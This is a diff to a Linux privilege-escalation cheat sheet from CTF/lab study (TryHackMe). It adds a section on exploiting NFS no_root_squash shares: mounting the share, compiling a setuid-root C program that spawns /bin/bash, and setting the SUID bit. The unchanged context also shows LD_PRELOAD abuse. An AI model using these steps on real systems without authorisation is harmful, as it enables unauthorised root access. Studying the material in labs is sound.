@@ -1,5 +1,9 @@
 # Linux Privilege Escalation
-**************************************
+
+*********************************************************************************
+Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
+Note: Bracket characters themselves [ ] require removal. See examples.
+*********************************************************************************
 
 ## Leverage LD_PRELOAD
 
@@ -38,7 +42,7 @@ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
 echo $PATH
 ```
-* What folders are located under $PATH
+* What folders are located under $PATH?
 * Does your current user have write privileges for any of these folders?
 * Can you modify $PATH?
 * Is there a script/application you can start that will be affected by this vulnerability?
@@ -79,6 +83,48 @@ chmod 777 [BINARY]
 ```
 ./path
 ```
+**************************************
+## Network File Sharing (NFS)
+
+If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+```
+cat /etc/exports
+```
+
+Enumerate mountable shares:
+```
+show mount -e [TARGET-IP]
+```
+
+Mount one of the “no_root_squash” shares to attack machine and start building executable:
+```
+mkdir /tmp/[YOUR-DIRECTORY]
+```
+```
+mount -o rw [TARGET-IP]:[SHARE-DIRECTORY] /tmp/[YOUR-DIRECTORY]
+```
+
+Set SUID bits with a simple executable that will run /bin/bash on the target system: (nfs.c)
+```
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+}
+```
+
+Compile the code:
+```
+gcc nfs.c -o nfs -w
+```
+```
+chmod +s nfs
+```
+```
+./nfs
+```
+
 **************************************
 ## Reference
 * https://tryhackme.com/room/linprivesc
